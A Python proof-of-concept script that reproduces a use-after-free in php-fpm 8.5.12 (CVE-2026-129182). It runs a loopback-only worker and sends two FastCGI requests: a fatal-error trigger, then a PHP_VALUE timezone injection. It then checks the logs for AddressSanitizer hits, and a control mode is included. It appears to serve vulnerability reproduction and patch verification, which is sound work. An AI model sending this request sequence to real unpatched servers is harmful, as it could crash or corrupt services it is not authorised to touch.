#!/usr/bin/env python3
"""CVE-2026-129182 / GHSA-2fjv-p558-g82m: fatal-backtrace global repopulation
after shutdown, replayed from the vendor's own regression test
`sapi/fpm/tests/fatal-error-backtrace-request-reset.phpt` (PHP 8.5.13 tree).

Loopback only: one static php-fpm worker on 127.0.0.1. Two requests:
  req1  /index.php?fatal=1  -> fatal error with fatal_error_backtraces=1
  req2  PHP_VALUE date.timezone=invalid applied before php_request_startup,
        while shutdown is still flagged; the resulting diagnostic repopulates
        EG(last_fatal_error_backtrace) on the affected 8.5.12 build.
The fix (8.5.13, Zend/zend.c:1511/:1540) gates both the dtor and the
repopulation on EG(active).

Usage:
  python3 lab/repro/php2shell-cve129182-fpm.py FPMBIN EVIDENCE_DIR PORT [--control] [--use-malloc]

All processes and sockets stay on this host; no external probe.
"""
import os
import pathlib
import re
import shutil
import signal
import subprocess
import sys
import tempfile
import time

HERE = pathlib.Path(__file__).resolve().parent
CLIENT = HERE / 'php2shell-fpm-client.py'
CONTROL = '--control' in sys.argv
USE_MALLOC = '--use-malloc' in sys.argv
ASAN_MARK = ('ERROR: AddressSanitizer', 'SUMMARY: AddressSanitizer',
             'heap-use-after-free')

CODE = r'''<?php
echo getmypid(), "\n";
if (isset($_GET['fatal'])) {
    function trigger_fatal() {
        eval("class RequestReset {}; class RequestReset {}");
    }
    trigger_fatal();
}
echo date_default_timezone_get(), "\n";
'''


def wait_port(port, tries=150):
    import socket
    for _ in range(tries):
        try:
            with socket.create_connection(('127.0.0.1', port), timeout=0.2):
                return True
        except OSError:
            time.sleep(0.1)
    return False


def fcgi(port, script, query='', php_value=None):
    cmd = [sys.executable, str(CLIENT), str(port), str(script)]
    if query:
        cmd += ['--param', 'QUERY_STRING=' + query]
    if php_value is not None:
        cmd += ['--param', 'PHP_VALUE=' + php_value]
    cp = subprocess.run(cmd, capture_output=True, timeout=40)
    return (cp.stdout.decode(errors='replace') +
            ('\n--- CLIENT STDERR ---\n' + cp.stderr.decode(errors='replace')
             if cp.stderr else ''))


def main():
    args = [a for a in sys.argv[1:] if not a.startswith('--')]
    fpm = pathlib.Path(args[0]).resolve()
    out = pathlib.Path(args[1] if len(args) > 1 else 'lab/build/evidence/w31-cve129182')
    port = int(args[2] if len(args) > 2 else 18190)
    out.mkdir(parents=True, exist_ok=True)
    d = pathlib.Path(tempfile.mkdtemp(prefix='cve129182-'))
    www = d / 'www'
    www.mkdir()
    (www / 'index.php').write_text(CODE)
    conf = f'''[global]
error_log = {d}/fpm-error.log
daemonize = no
log_level = notice
pid = {d}/fpm.pid
process_control_timeout = 2

[www]
listen = 127.0.0.1:{port}
pm = static
pm.max_children = 1
pm.max_requests = 0
catch_workers_output = yes
clear_env = no
env[ZEND_ASAN_FORCE_FAST_SHUTDOWN] = 1
php_admin_value[opcache.enable] = 0
php_admin_value[memory_limit] = 16M
php_admin_value[max_execution_time] = 0
php_admin_value[fatal_error_backtraces] = 1
php_admin_value[display_errors] = 0
php_admin_value[log_errors] = 1
php_admin_value[error_reporting] = 32767
php_admin_value[date.timezone] = UTC
php_admin_value[html_errors] = 0
'''
    (d / 'fpm.conf').write_text(conf)
    env = dict(os.environ)
    if USE_MALLOC:
        env.update(USE_ZEND_ALLOC='0', USE_TRACKED_ALLOC='1')
    env.update(ASAN_OPTIONS='detect_leaks=0:abort_on_error=1:allocator_may_return_null=1',
               UBSAN_OPTIONS='halt_on_error=1')
    cmd = [str(fpm), '-n', '-F', '-y', str(d / 'fpm.conf'),
           '-d', 'error_log=' + str(d / 'php-error.log')]
    log = out / ('control.log' if CONTROL else
                 ('vulnerable-malloc' if USE_MALLOC else 'vulnerable-shape'))
    with (d / 'fpm-stdout.log').open('wb') as fo:
        gp = subprocess.Popen(cmd, env=env, stdout=fo, stderr=subprocess.STDOUT,
                              start_new_session=True)
        try:
            if not wait_port(port):
                raise RuntimeError('FPM never bound 127.0.0.1:%d' % port)
            req1 = ('clean' if CONTROL else
                    fcgi(port, www / 'index.php', query='fatal=1'))
            time.sleep(0.5)
            req2 = fcgi(port, www / 'index.php', php_value='date.timezone=invalid')
            time.sleep(1)
        finally:
            try:
                gp.wait(timeout=5)
            except subprocess.TimeoutExpired:
                os.killpg(gp.pid, signal.SIGKILL)
                gp.wait()
    texts = {}
    for name in ('fpm-stdout.log', 'fpm-error.log', 'php-error.log'):
        p = d / name
        if p.exists():
            texts[name] = p.read_text(errors='replace')[:12000]
    report = ('build=%s mode=%s\n=== config ===\n%s\n'
              '=== req1 (fatal, or clean control) ===\n%s\n'
              '=== req2 (PHP_VALUE date.timezone=invalid) ===\n%s\n' %
              (fpm, 'control' if CONTROL else 'attack', conf, req1, req2))
    report += ''.join('=== %s ===\n%s\n' % (k, v) for k, v in texts.items())
    log.write_text(report)
    blob = req1 + req2 + '\n'.join(texts.values())
    hits = [m for m in ASAN_MARK if m in blob]
    print('label=129182 mode=%s allocator=%s build=%s' %
          ('control' if CONTROL else 'attack',
           'malloc-backed' if USE_MALLOC else 'ZendMM', fpm))
    print('req1=%r req2=%r' % (req1[:120], req2[:120]))
    print('asan_markers=%s' % hits)
    for line in blob.splitlines():
        if any(m in line for m in ASAN_MARK) or 'SUMMARY:' in line or 'READ of size' in line:
            print('  ' + line[:220])
    print('log=%s' % log)
    print('VERDICT=' + ('UAF_OBSERVED' if hits else 'CLEAN_NO_UAF'))
    shutil.rmtree(d, ignore_errors=True)


if __name__ == '__main__':
    main()
